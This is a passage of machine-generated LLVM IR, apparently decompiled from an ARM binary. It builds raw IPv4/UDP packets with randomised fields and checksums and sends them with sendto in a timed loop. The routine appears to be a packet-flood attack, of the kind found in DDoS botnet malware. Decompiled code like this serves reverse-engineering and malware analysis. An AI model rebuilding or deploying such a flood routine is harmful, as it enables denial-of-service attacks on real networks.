  %v1_e0fc = add i32 %v2_e0f8, 16
  %v2_e0fc = inttoptr i32 %v1_e0fc to i32*
  %v3_e0fc = load i32, i32* %v2_e0fc, align 4
  %v1_e100 = add i32 %v1_e0f4, 1
  store i32 %v1_e100, i32* %r4.global-to-local, align 4
  store i32 %v4_e104, i32* %ip.global-to-local, align 4
  store i32 %v1_de14, i32* %r2.global-to-local, align 4
  %v1_e10c = load i32, i32* %r1.global-to-local, align 4
  %v2_e10c = add i32 %v1_e10c, 16
  %v3_e10c = inttoptr i32 %v2_e10c to i32*
  store i32 %v3_e0fc, i32* %v3_e10c, align 4
  store i32 %v4_e110, i32* %r0.global-to-local, align 4
  %v0_e114 = load i32, i32* %ip.global-to-local, align 4
  %v1_e114 = trunc i32 %v0_e114 to i8
  %v2_e114 = load i32, i32* %r1.global-to-local, align 4
  %v3_e114 = add i32 %v2_e114, 2
  %v4_e114 = inttoptr i32 %v3_e114 to i8*
  store i8 %v1_e114, i8* %v4_e114, align 1
  %v0_e118 = load i32, i32* %r0.global-to-local, align 4
  %v1_e118 = trunc i32 %v0_e118 to i8
  %v2_e118 = load i32, i32* %r1.global-to-local, align 4
  %v3_e118 = add i32 %v2_e118, 3
  %v4_e118 = inttoptr i32 %v3_e118 to i8*
  store i8 %v1_e118, i8* %v4_e118, align 1
  store i32 %v4_e11c, i32* %ip.global-to-local, align 4
  store i32 %v4_e120, i32* %r0.global-to-local, align 4
  %v0_e124 = load i32, i32* %r4.global-to-local, align 4
  %v1_e124 = load i32, i32* %r2.global-to-local, align 4
  %v9_e124 = icmp eq i32 %v0_e124, %v1_e124
  store i1 %v9_e124, i1* %cpsr_z.global-to-local, align 1
  store i32 %v4_e128, i32* %r2.global-to-local, align 4
  %v0_e12c = load i32, i32* %r1.global-to-local, align 4
  %v1_e12c = add i32 %v0_e12c, 20
  store i32 %v1_e12c, i32* %r3.global-to-local, align 4
  %v3_e130 = add i32 %v0_e12c, 4
  %v4_e130 = inttoptr i32 %v3_e130 to i8*
  store i8 %v5_e054, i8* %v4_e130, align 1
  %v0_e134 = load i32, i32* %ip.global-to-local, align 4
  %v1_e134 = trunc i32 %v0_e134 to i8
  %v2_e134 = load i32, i32* %r1.global-to-local, align 4
  %v3_e134 = add i32 %v2_e134, 5
  %v4_e134 = inttoptr i32 %v3_e134 to i8*
  store i8 %v1_e134, i8* %v4_e134, align 1
  %v0_e138 = load i32, i32* %r5.global-to-local, align 4
  %v1_e138 = trunc i32 %v0_e138 to i8
  %v2_e138 = load i32, i32* %r1.global-to-local, align 4
  %v3_e138 = add i32 %v2_e138, 20
  %v4_e138 = inttoptr i32 %v3_e138 to i8*
  store i8 %v1_e138, i8* %v4_e138, align 1
  %v0_e13c = load i32, i32* %r7.global-to-local, align 4
  %v1_e13c = trunc i32 %v0_e13c to i8
  %v2_e13c = load i32, i32* %r3.global-to-local, align 4
  %v3_e13c = add i32 %v2_e13c, 5
  %v4_e13c = inttoptr i32 %v3_e13c to i8*
  store i8 %v1_e13c, i8* %v4_e13c, align 1
  %v0_e140 = load i32, i32* %r0.global-to-local, align 4
  %v1_e140 = trunc i32 %v0_e140 to i8
  %v2_e140 = load i32, i32* %r3.global-to-local, align 4
  %v3_e140 = add i32 %v2_e140, 1
  %v4_e140 = inttoptr i32 %v3_e140 to i8*
  store i8 %v1_e140, i8* %v4_e140, align 1
  %v0_e144 = load i32, i32* %r6.global-to-local, align 4
  %v1_e144 = trunc i32 %v0_e144 to i8
  %v2_e144 = load i32, i32* %r3.global-to-local, align 4
  %v3_e144 = add i32 %v2_e144, 2
  %v4_e144 = inttoptr i32 %v3_e144 to i8*
  store i8 %v1_e144, i8* %v4_e144, align 1
  %v0_e148 = load i32, i32* %sl.global-to-local, align 4
  %v1_e148 = trunc i32 %v0_e148 to i8
  %v2_e148 = load i32, i32* %r3.global-to-local, align 4
  %v3_e148 = add i32 %v2_e148, 3
  %v4_e148 = inttoptr i32 %v3_e148 to i8*
  store i8 %v1_e148, i8* %v4_e148, align 1
  %v0_e14c = load i32, i32* %sb.global-to-local, align 4
  %v1_e14c = trunc i32 %v0_e14c to i8
  %v2_e14c = load i32, i32* %r3.global-to-local, align 4
  %v3_e14c = add i32 %v2_e14c, 4
  %v4_e14c = inttoptr i32 %v3_e14c to i8*
  store i8 %v1_e14c, i8* %v4_e14c, align 1
  %v0_e150 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_e150, i32* %stack_var_-40, align 4
  %v5_e154 = icmp slt i32 %v0_e124, %v1_e124
  br i1 %v5_e154, label %dec_label_pc_e08c, label %dec_label_pc_e158.preheader

dec_label_pc_e158.preheader:                      ; preds = %dec_label_pc_e3d8, %dec_label_pc_e08c, %.dec_label_pc_e158.preheader_crit_edge
  %v1_e178.pre-phi = phi i32 [ %.pre20, %.dec_label_pc_e158.preheader_crit_edge ], [ %v1_e000, %dec_label_pc_e08c ], [ %v1_e000, %dec_label_pc_e3d8 ]
  %v1_e174.pre-phi = phi i32 [ %.pre, %.dec_label_pc_e158.preheader_crit_edge ], [ %v1_e004, %dec_label_pc_e08c ], [ %v1_e004, %dec_label_pc_e3d8 ]
  %v9_e308 = icmp eq i32 %v3_dfd8, add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1)
  %v2_e1bc = icmp eq i32 %v1_df34, 0
  br label %dec_label_pc_e158

dec_label_pc_e158:                                ; preds = %dec_label_pc_e158.preheader, %dec_label_pc_e384
  store i32 %v1_de14, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 %v2_dfe4, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  br i1 %v2_dfe4, label %dec_label_pc_e384, label %dec_label_pc_e16c

dec_label_pc_e16c:                                ; preds = %dec_label_pc_e158
  store i32 %v0_dfbc, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v1_e174.pre-phi, i32* @sb, align 4
  store i32 %v1_e178.pre-phi, i32* @sl, align 4
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_e270

dec_label_pc_e184:                                ; preds = %dec_label_pc_e270
  %v0_e184 = load i32, i32* @fp, align 4
  %v7_e184 = icmp eq i32 %v0_e184, -1
  store i1 %v7_e184, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e184, label %dec_label_pc_e2f8, label %dec_label_pc_e18c

dec_label_pc_e18c:                                ; preds = %dec_label_pc_e294, %dec_label_pc_e184
  store i32 %v3_dfd8, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_e308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e308, label %dec_label_pc_e314, label %dec_label_pc_e1a0

dec_label_pc_e1a0:                                ; preds = %dec_label_pc_e2f8.dec_label_pc_e1a0_crit_edge, %dec_label_pc_e18c
  %v1_e1a4 = phi i32 [ %v1_e1a4.pre, %dec_label_pc_e2f8.dec_label_pc_e1a0_crit_edge ], [ add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), %dec_label_pc_e18c ]
  store i32 %v3_dfdc, i32* %r0.global-to-local, align 4
  %v9_e1a4 = icmp eq i32 %v3_dfdc, %v1_e1a4
  store i1 %v9_e1a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e1a4, label %dec_label_pc_e330, label %dec_label_pc_e1ac

dec_label_pc_e1ac:                                ; preds = %dec_label_pc_e314.dec_label_pc_e1ac_crit_edge, %dec_label_pc_e1a0
  %v1_e1b0 = phi i32 [ %v1_e1b0.pre, %dec_label_pc_e314.dec_label_pc_e1ac_crit_edge ], [ %v1_e1a4, %dec_label_pc_e1a0 ]
  store i32 %v3_dfe0, i32* %r1.global-to-local, align 4
  %v9_e1b0 = icmp eq i32 %v3_dfe0, %v1_e1b0
  store i1 %v9_e1b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_e1b0, label %dec_label_pc_e34c, label %dec_label_pc_e1b8

dec_label_pc_e1b8:                                ; preds = %dec_label_pc_e330, %dec_label_pc_e1ac
  store i32 %v1_df34, i32* %r2.global-to-local, align 4
  store i1 %v2_e1bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_e1bc, label %dec_label_pc_e1c4, label %dec_label_pc_e368

dec_label_pc_e1c4:                                ; preds = %dec_label_pc_e1b8, %dec_label_pc_e34c, %dec_label_pc_e368
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_e1c8 = load i32, i32* @r7, align 4
  %v1_e1c8 = trunc i32 %v0_e1c8 to i8
  %v2_e1c8 = load i32, i32* @r5, align 4
  %v3_e1c8 = add i32 %v2_e1c8, 10
  %v4_e1c8 = inttoptr i32 %v3_e1c8 to i8*
  store i8 %v1_e1c8, i8* %v4_e1c8, align 1
  %v0_e1cc = load i32, i32* @r7, align 4
  %v1_e1cc = trunc i32 %v0_e1cc to i8
  %v2_e1cc = load i32, i32* @r5, align 4
  %v3_e1cc = add i32 %v2_e1cc, 11
  %v4_e1cc = inttoptr i32 %v3_e1cc to i8*
  store i8 %v1_e1cc, i8* %v4_e1cc, align 1
  %v0_e1d0 = load i32, i32* @r5, align 4
  store i32 %v0_e1d0, i32* @r0, align 4
  %v2_e1d4 = call i32 @function_f188(i32 %v0_e1d0, i32 20)
  %v3_e1d4 = trunc i32 %v2_e1d4 to i8
  store i32 %v2_e1d4, i32* %r0.global-to-local, align 4
  %v4_e1d8 = sdiv i32 %v2_e1d4, 256
  store i32 %v4_e1d8, i32* %r3.global-to-local, align 4
  %v1_e1dc = trunc i32 %v4_e1d8 to i8
  %v2_e1dc = load i32, i32* @r5, align 4
  %v3_e1dc = add i32 %v2_e1dc, 11
  %v4_e1dc = inttoptr i32 %v3_e1dc to i8*
  store i8 %v1_e1dc, i8* %v4_e1dc, align 1
  %v3_e1e0 = load i32, i32* @r5, align 4
  %v4_e1e0 = add i32 %v3_e1e0, 10
  %v5_e1e0 = inttoptr i32 %v4_e1e0 to i8*
  store i8 %v3_e1d4, i8* %v5_e1e0, align 1
  %v0_e1e4 = load i32, i32* @r7, align 4
  %v1_e1e4 = trunc i32 %v0_e1e4 to i8
  %v2_e1e4 = load i32, i32* @r6, align 4
  %v3_e1e4 = add i32 %v2_e1e4, 6
  %v4_e1e4 = inttoptr i32 %v3_e1e4 to i8*
  store i8 %v1_e1e4, i8* %v4_e1e4, align 1
  %v0_e1e8 = load i32, i32* @r7, align 4
  %v1_e1e8 = trunc i32 %v0_e1e8 to i8
  %v2_e1e8 = load i32, i32* @r6, align 4
  %v3_e1e8 = add i32 %v2_e1e8, 7
  %v4_e1e8 = inttoptr i32 %v3_e1e8 to i8*
  store i8 %v1_e1e8, i8* %v4_e1e8, align 1
  %v0_e1ec = load i32, i32* @r5, align 4
  %v1_e1ec = add i32 %v0_e1ec, 24
  %v2_e1ec = inttoptr i32 %v1_e1ec to i8*
  %v3_e1ec = load i8, i8* %v2_e1ec, align 1
  %v4_e1ec = zext i8 %v3_e1ec to i32
  store i32 %v4_e1ec, i32* %r3.global-to-local, align 4
  %v1_e1f0 = add i32 %v0_e1ec, 25
  %v2_e1f0 = inttoptr i32 %v1_e1f0 to i8*
  %v3_e1f0 = load i8, i8* %v2_e1f0, align 1
  %v4_e1f0 = zext i8 %v3_e1f0 to i32
  %v0_e1f4 = load i32, i32* @r6, align 4
  store i32 %v0_e1f4, i32* @r1, align 4
  %v4_e1f8 = mul nuw nsw i32 %v4_e1f0, 256
  %v5_e1f8 = or i32 %v4_e1f8, %v4_e1ec
  store i32 %v5_e1f8, i32* %r2.global-to-local, align 4
  store i32 %v0_e1ec, i32* %r0.global-to-local, align 4
  %v0_e200 = load i32, i32* @sb, align 4
  store i32 %v0_e200, i32* %r3.global-to-local, align 4
  %v4_e204 = call i32 @function_f1e4(i32 %v0_e1ec, i32 %v0_e1f4, i32 %v5_e1f8, i32 %v0_e200)
  %v5_e204 = trunc i32 %v4_e204 to i8
  store i32 %v4_e204, i32* %r0.global-to-local, align 4
  %v4_e20825 = udiv i32 %v4_e204, 256
  %v1_e20c = trunc i32 %v4_e20825 to i8
  %v2_e20c = load i32, i32* @r6, align 4
  %v3_e20c = add i32 %v2_e20c, 7
  %v4_e20c = inttoptr i32 %v3_e20c to i8*
  store i8 %v1_e20c, i8* %v4_e20c, align 1
  %v3_e210 = load i32, i32* @r6, align 4
  %v4_e210 = add i32 %v3_e210, 6
  %v5_e210 = inttoptr i32 %v4_e210 to i8*
  store i8 %v5_e204, i8* %v5_e210, align 1
  %v3_e214 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e214, i32* %r3.global-to-local, align 4
  %v0_e218 = load i32, i32* @r5, align 4
  %v1_e218 = add i32 %v0_e218, 20
  %v2_e218 = inttoptr i32 %v1_e218 to i32*
  %v3_e218 = load i32, i32* %v2_e218, align 4
  %v3_e220 = udiv i32 %v3_e218, 65536
  store i32 %v3_e220, i32* %r2.global-to-local, align 4
  %v5_e224 = mul i32 %v3_e214, 24
  %v1_e228 = load i32, i32* @r8, align 4
  %v2_e228 = add i32 %v1_e228, %v5_e224
  store i32 %v2_e228, i32* %ip.global-to-local, align 4
  %v3_e22c22 = udiv i32 %v3_e218, 16777216
  %v1_e230 = trunc i32 %v3_e22c22 to i8
  %v3_e230 = add i32 %v2_e228, 3
  %v4_e230 = inttoptr i32 %v3_e230 to i8*
  store i8 %v1_e230, i8* %v4_e230, align 1
  %v0_e234 = load i32, i32* %r2.global-to-local, align 4
  %v1_e234 = trunc i32 %v0_e234 to i8
  %v2_e234 = load i32, i32* %ip.global-to-local, align 4
  %v3_e234 = add i32 %v2_e234, 2
  %v4_e234 = inttoptr i32 %v3_e234 to i8*
  store i8 %v1_e234, i8* %v4_e234, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %r4.global-to-local, align 4
  %v0_e240 = load i32, i32* @r5, align 4
  store i32 %v0_e240, i32* %r1.global-to-local, align 4
  store i32 %v3_df6c, i32* %r0.global-to-local, align 4
  %v0_e248 = load i32, i32* @sl, align 4
  store i32 %v0_e248, i32* %r2.global-to-local, align 4
  %v0_e250 = load i32, i32* %ip.global-to-local, align 4
  %v4_e250 = inttoptr i32 %v0_e250 to %sockaddr*
  %v7_e254 = inttoptr i32 %v0_e240 to i32*
  %v9_e254 = call i32 @sendto(i32 %v3_df6c, i32* %v7_e254, i32 %v0_e248, i32 16384, %sockaddr* %v4_e250, i32 16)
  %v3_e258 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e258, i32* %r3.global-to-local, align 4
  store i32 %v1_de14, i32* %r4.global-to-local, align 4
  %v1_e260 = add i32 %v3_e258, 1
  store i32 %v1_e260, i32* %r0.global-to-local, align 4
  %v9_e264 = icmp eq i32 %v1_e260, %v1_de14
  store i1 %v9_e264, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_e260, i32* %stack_var_-40, align 4
  %v6_e26c = icmp slt i32 %v1_e260, %v1_de14
  br i1 %v6_e26c, label %dec_label_pc_e270, label %dec_label_pc_e384

dec_label_pc_e270:                                ; preds = %dec_label_pc_e1c4, %dec_label_pc_e16c
  %v1_e284 = phi i32 [ %v1_e260, %dec_label_pc_e1c4 ], [ 0, %dec_label_pc_e16c ]
  %v5_e274 = mul i32 %v1_e284, 24
  %v1_e278 = load i32, i32* @r8, align 4
  %v2_e278 = add i32 %v1_e278, %v5_e274
  store i32 %v2_e278, i32* %r3.global-to-local, align 4
  store i32 %v4_de40, i32* %r4.global-to-local, align 4
  %v1_e280 = add i32 %v2_e278, 20
  %v2_e280 = inttoptr i32 %v1_e280 to i8*
  %v3_e280 = load i8, i8* %v2_e280, align 1
  %v4_e280 = zext i8 %v3_e280 to i32
  store i32 %v4_e280, i32* %r2.global-to-local, align 4
  %v4_e284 = mul i32 %v1_e284, 4
  %v5_e284 = add i32 %v4_e284, %v4_de40
  %v6_e284 = inttoptr i32 %v5_e284 to i32*
  %v7_e284 = load i32, i32* %v6_e284, align 4
  store i32 %v7_e284, i32* @r5, align 4
  %v2_e288 = icmp ugt i8 %v3_e280, 30
  %v7_e288 = icmp eq i8 %v3_e280, 31
  store i1 %v7_e288, i1* %cpsr_z.global-to-local, align 1
  %v1_e28c = add i32 %v7_e284, 20
  store i32 %v1_e28c, i32* @r6, align 4
  %v2_e290 = xor i1 %v7_e288, true
  %v3_e290 = and i1 %v2_e288, %v2_e290
  br i1 %v3_e290, label %dec_label_pc_e184, label %dec_label_pc_e294

dec_label_pc_e294:                                ; preds = %dec_label_pc_e270
  %v1_e294 = add i32 %v2_e278, 16
  %v2_e294 = inttoptr i32 %v1_e294 to i32*
  %v3_e294 = load i32, i32* %v2_e294, align 4
  store i32 %v3_e294, i32* %r4.global-to-local, align 4
  %v0_e298 = call i32 @function_105b0()
  store i32 %v0_e298, i32* %r0.global-to-local, align 4
  %v3_e29c = load i32, i32* %stack_var_-40, align 4
  %v5_e2a4 = mul i32 %v3_e29c, 24
  %v1_e2ac = load i32, i32* @r8, align 4
  %v2_e2ac = add i32 %v1_e2ac, %v5_e2a4
  store i32 %v2_e2ac, i32* %r1.global-to-local, align 4
  %v1_e2b0 = and i32 %v3_e294, 65280
  store i32 %v1_e2b0, i32* %r3.global-to-local, align 4
  %v1_e2a8 = udiv i32 %v3_e294, 256
  %v3_e2b4 = and i32 %v1_e2a8, 65280
  store i32 %v3_e2b4, i32* %r2.global-to-local, align 4
  %v3_e2b8 = mul i32 %v3_e294, 16777216
  store i32 %v3_e2b8, i32* %ip.global-to-local, align 4
  %v1_e2bc = add i32 %v2_e2ac, 20
  %v2_e2bc = inttoptr i32 %v1_e2bc to i8*
  %v3_e2bc = load i8, i8* %v2_e2bc, align 1
  %v4_e2bc = zext i8 %v3_e2bc to i32
  %v4_e2c0 = mul nuw nsw i32 %v1_e2b0, 256
  %v5_e2c0 = or i32 %v4_e2c0, %v3_e2b8
  store i32 %v5_e2c0, i32* %ip.global-to-local, align 4
  %v2_e2c8 = call i32 @llvm.bswap.i32(i32 %v3_e294)
  %v7_e2cc = lshr i32 %v0_e298, %v4_e2bc
  %v8_e2cc = add i32 %v7_e2cc, %v2_e2c8
  store i32 %v8_e2cc, i32* %r2.global-to-local, align 4
  %v3_e2d8 = mul i32 %v8_e2cc, 16777216
  %v1_e2dc = and i32 %v8_e2cc, 65280
  store i32 %v1_e2dc, i32* %r0.global-to-local, align 4
  %v4_e2e0 = mul nuw nsw i32 %v1_e2dc, 256
  %v5_e2e0 = or i32 %v4_e2e0, %v3_e2d8
  store i32 %v5_e2e0, i32* %r1.global-to-local, align 4
  %v2_e2e8 = call i32 @llvm.bswap.i32(i32 %v8_e2cc)
  store i32 %v2_e2e8, i32* %r3.global-to-local, align 4
  %v0_e2ec = load i32, i32* @fp, align 4
  %v3_e2ec = icmp eq i32 %v0_e2ec, -1
  %v8_e2ec = icmp eq i32 %v0_e2ec, -1
  store i1 %v8_e2ec, i1* %cpsr_z.global-to-local, align 1
  %v1_e2f0 = load i32, i32* @r5, align 4
  %v2_e2f0 = add i32 %v1_e2f0, 16
  %v3_e2f0 = inttoptr i32 %v2_e2f0 to i32*
  store i32 %v2_e2e8, i32* %v3_e2f0, align 4
  br i1 %v3_e2ec, label %dec_label_pc_e2f8, label %dec_label_pc_e18c

dec_label_pc_e2f8:                                ; preds = %dec_label_pc_e294, %dec_label_pc_e184
  %v0_e2f8 = call i32 @function_105b0()
  store i32 %v0_e2f8, i32* %r0.global-to-local, align 4
  store i32 %v3_dfd8, i32* %ip.global-to-local, align 4
  store i32 add (i32 ptrtoint ([3 x i8]* @global_var_10000.78 to i32), i32 -1), i32* @r4, align 4
  store i1 %v9_e308, i1* %cpsr_z.global-to-local, align 1
  %v1_e30c = load i32, i32* @r5, align 4
  %v2_e30c = add i32 %v1_e30c, 12
  %v3_e30c = inttoptr i32 %v2_e30c to i32*
  store i32 %v0_e2f8, i32* %v3_e30c, align 4
  br i1 %v9_e308, label %dec_label_pc_e314, label %dec_label_pc_e2f8.dec_label_pc_e1a0_crit_edge

dec_label_pc_e2f8.dec_label_pc_e1a0_crit_edge:    ; preds = %dec_label_pc_e2f8
  %v1_e1a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e1a0

dec_label_pc_e314:                                ; preds = %dec_label_pc_e2f8, %dec_label_pc_e18c
  %v0_e314 = call i32 @function_105b0()
  %v1_e314 = trunc i32 %v0_e314 to i8
  %v4_e318 = sdiv i32 %v0_e314, 256
  store i32 %v4_e318, i32* %r3.global-to-local, align 4
  %v3_e31c = load i32, i32* @r5, align 4
  %v4_e31c = add i32 %v3_e31c, 4
  %v5_e31c = inttoptr i32 %v4_e31c to i8*
  store i8 %v1_e314, i8* %v5_e31c, align 1
  store i32 %v3_dfdc, i32* %r0.global-to-local, align 4
  %v1_e324 = load i32, i32* @r4, align 4
  %v9_e324 = icmp eq i32 %v3_dfdc, %v1_e324
  store i1 %v9_e324, i1* %cpsr_z.global-to-local, align 1
  %v0_e328 = load i32, i32* %r3.global-to-local, align 4
  %v1_e328 = trunc i32 %v0_e328 to i8
  %v2_e328 = load i32, i32* @r5, align 4
  %v3_e328 = add i32 %v2_e328, 5
  %v4_e328 = inttoptr i32 %v3_e328 to i8*
  store i8 %v1_e328, i8* %v4_e328, align 1
  %v0_e32c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e32c, label %dec_label_pc_e330, label %dec_label_pc_e314.dec_label_pc_e1ac_crit_edge

dec_label_pc_e314.dec_label_pc_e1ac_crit_edge:    ; preds = %dec_label_pc_e314
  %v1_e1b0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e1ac

dec_label_pc_e330:                                ; preds = %dec_label_pc_e314, %dec_label_pc_e1a0
  %v0_e330 = call i32 @function_105b0()
  %v1_e330 = trunc i32 %v0_e330 to i8
  store i32 %v0_e330, i32* %r0.global-to-local, align 4
  store i32 %v3_dfe0, i32* %r1.global-to-local, align 4
  %v4_e338 = sdiv i32 %v0_e330, 256
  store i32 %v4_e338, i32* %r3.global-to-local, align 4
  %v1_e33c = load i32, i32* @r4, align 4
  %v9_e33c = icmp eq i32 %v3_dfe0, %v1_e33c
  store i1 %v9_e33c, i1* %cpsr_z.global-to-local, align 1
  %v3_e340 = load i32, i32* @r5, align 4
  %v4_e340 = add i32 %v3_e340, 20
  %v5_e340 = inttoptr i32 %v4_e340 to i8*
  store i8 %v1_e330, i8* %v5_e340, align 1
  %v0_e344 = load i32, i32* %r3.global-to-local, align 4
  %v1_e344 = trunc i32 %v0_e344 to i8
  %v2_e344 = load i32, i32* @r6, align 4
  %v3_e344 = add i32 %v2_e344, 1
  %v4_e344 = inttoptr i32 %v3_e344 to i8*
  store i8 %v1_e344, i8* %v4_e344, align 1
  %v0_e348 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e348, label %dec_label_pc_e34c, label %dec_label_pc_e1b8

dec_label_pc_e34c:                                ; preds = %dec_label_pc_e330, %dec_label_pc_e1ac
  %v0_e34c = call i32 @function_105b0()
  %v1_e34c = trunc i32 %v0_e34c to i8
  store i32 %v0_e34c, i32* %r0.global-to-local, align 4
  store i32 %v1_df34, i32* %r2.global-to-local, align 4
  %v4_e354 = sdiv i32 %v0_e34c, 256
  store i32 %v4_e354, i32* %r3.global-to-local, align 4
  store i1 %v2_e1bc, i1* %cpsr_z.global-to-local, align 1
  %v1_e35c = trunc i32 %v4_e354 to i8
  %v2_e35c = load i32, i32* @r6, align 4
  %v3_e35c = add i32 %v2_e35c, 3
  %v4_e35c = inttoptr i32 %v3_e35c to i8*
  store i8 %v1_e35c, i8* %v4_e35c, align 1
  %v3_e360 = load i32, i32* @r6, align 4
  %v4_e360 = add i32 %v3_e360, 2
  %v5_e360 = inttoptr i32 %v4_e360 to i8*
  store i8 %v1_e34c, i8* %v5_e360, align 1
  %v0_e364 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_e364, label %dec_label_pc_e1c4, label %dec_label_pc_e368

dec_label_pc_e368:                                ; preds = %dec_label_pc_e1b8, %dec_label_pc_e34c
  %v0_e368 = load i32, i32* @r5, align 4
  %v1_e368 = add i32 %v0_e368, 28
  store i32 %v1_e368, i32* @r4, align 4
  store i32 %v1_e368, i32* %r0.global-to-local, align 4
  store i32 %v0_dfbc, i32* %r1.global-to-local, align 4
  %v2_e374 = call i32 @function_10664(i32 %v1_e368, i32 %v0_dfbc)
  store i32 %v2_e374, i32* %r0.global-to-local, align 4
  store i32 %v0_dfbc, i32* %r3.global-to-local, align 4
  %v0_e37c = load i32, i32* @r7, align 4
  %v1_e37c = trunc i32 %v0_e37c to i8
  %v2_e37c = load i32, i32* @r4, align 4
  %v4_e37c = add i32 %v2_e37c, %v0_dfbc
  %v5_e37c = inttoptr i32 %v4_e37c to i8*
  store i8 %v1_e37c, i8* %v5_e37c, align 1
  br label %dec_label_pc_e1c4

dec_label_pc_e384:                                ; preds = %dec_label_pc_e1c4, %dec_label_pc_e158
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_e388 = call i32 @time(i32* null)
  store i32 %v2_e388, i32* %r0.global-to-local, align 4
  store i32 %v2_df58, i32* %sb.global-to-local, align 4
  %v9_e390 = icmp eq i32 %v2_df58, %v2_e388
  store i1 %v9_e390, i1* %cpsr_z.global-to-local, align 1
  %v6_e394 = icmp slt i32 %v2_df58, %v2_e388
  br i1 %v6_e394, label %dec_label_pc_e398, label %dec_label_pc_e158

dec_label_pc_e398:                                ; preds = %dec_label_pc_e384, %dec_label_pc_de10, %dec_label_pc_e3a0
  %v29_e39c = phi i32 [ %v3_df6c, %dec_label_pc_de10 ], [ %v1_e3a4, %dec_label_pc_e3a0 ], [ %v2_e388, %dec_label_pc_e384 ]
  store i32 %v3_de10, i32* %r4.global-to-local, align 4
  store i32 %v6_de10, i32* %r5.global-to-local, align 4
  store i32 %v9_de10, i32* %r6.global-to-local, align 4
  store i32 %v12_de10, i32* %r7.global-to-local, align 4
  store i32 %v18_de10, i32* %sb.global-to-local, align 4
  store i32 %v21_de10, i32* %sl.global-to-local, align 4
  ret i32 %v29_e39c

dec_label_pc_e3a0:                                ; preds = %dec_label_pc_df7c
  store i32 %v3_df6c, i32* %r0.global-to-local, align 4
  %v1_e3a4 = call i32 @close(i32 %v3_df6c)
  store i32 %v1_e3a4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_e398

dec_label_pc_e3ac:                                ; preds = %dec_label_pc_dffc
  %v3_e3b0 = sext i8 %v5_e050 to i32
  %v7_e3b0 = sext i8 %v5_e054 to i32
  %v3_e3b4 = sdiv i32 %v3_e3b0, 256
  store i32 %v3_e3b4, i32* %r1.global-to-local, align 4
  %v3_e3b8 = sdiv i32 %v7_e3b0, 256
  store i32 %v3_e3b8, i32* %r2.global-to-local, align 4
  store i32 %v1_e008, i32* %r3.global-to-local, align 4
  store i32 %v0_dfe8, i32* %r4.global-to-local, align 4
  store i32 %v1_e04c, i32* %sl.global-to-local, align 4
  %v3_e3d421 = udiv i32 %v1_e040, 256
  store i32 %v3_e3d421, i32* %r7.global-to-local, align 4
  %v4_e420 = sext i8 %v5_de78 to i32
  %sext10 = mul i32 %v6_ded8, 16777216
  %v4_e46c = sdiv i32 %sext10, 16777216
  br label %dec_label_pc_e3d8

dec_label_pc_e3d8:                                ; preds = %dec_label_pc_e3d8, %dec_label_pc_e3ac
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 1510, i32* %r0.global-to-local, align 4
  %v2_e3e4 = call i32* @calloc(i32 1510, i32 1)
  %v4_e3e4 = ptrtoint i32* %v2_e3e4 to i32
  store i32 %v4_e3e4, i32* %r0.global-to-local, align 4
  store i32 %v4_de40, i32* %ip.global-to-local, align 4
  %v3_e3ec = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_e3ec, i32* %r2.global-to-local, align 4
  %v2_e3f0 = load i32, i32* %r4.global-to-local, align 4
  %v5_e3f0 = mul i32 %v2_e3f0, 4
  %v6_e3f0 = add i32 %v5_e3f0, %v4_de40
  %v7_e3f0 = inttoptr i32 %v6_e3f0 to i32*
  store i32 %v4_e3e4, i32* %v7_e3f0, align 4
  %v0_e3f4 = load i32, i32* %ip.global-to-local, align 4
  %v1_e3f4 = load i32, i32* %r2.global-to-local, align 4
  %v4_e3f4 = mul i32 %v1_e3f4, 4
  %v5_e3f4 = add i32 %v4_e3f4, %v0_e3f4
  %v6_e3f4 = inttoptr i32 %v5_e3f4 to i32*
  %v7_e3f4 = load i32, i32* %v6_e3f4, align 4
  store i32 %v7_e3f4, i32* %r1.global-to-local, align 4
  %v1_e3f8 = inttoptr i32 %v7_e3f4 to i8*
  %v2_e3f8 = load i8, i8* %v1_e3f8, align 1
  %tmp68 = urem i8 %v2_e3f8, 16
  %v1_e3fc = zext i8 %tmp68 to i32
  %v1_e400 = or i32 %v1_e3fc, 64
  store i32 %v1_e400, i32* %r3.global-to-local, align 4
  %v1_e404 = trunc i32 %v1_e400 to i8
  store i8 %v1_e404, i8* %v1_e3f8, align 1
  %v0_e408 = load i32, i32* %r1.global-to-local, align 4
  %v1_e408 = inttoptr i32 %v0_e408 to i8*
  %v2_e408 = load i8, i8* %v1_e408, align 1
  %v3_e408 = zext i8 %v2_e408 to i32
  %v1_e40c = and i32 %v3_e408, 240
  %v1_e410 = or i32 %v1_e40c, 5
  store i32 %v1_e410, i32* %r2.global-to-local, align 4
  %v3_e418 = add i32 %v0_e408, 9
  %v4_e418 = inttoptr i32 %v3_e418 to i8*
  store i8 17, i8* %v4_e418, align 1
  %v0_e41c = load i32, i32* %r2.global-to-local, align 4
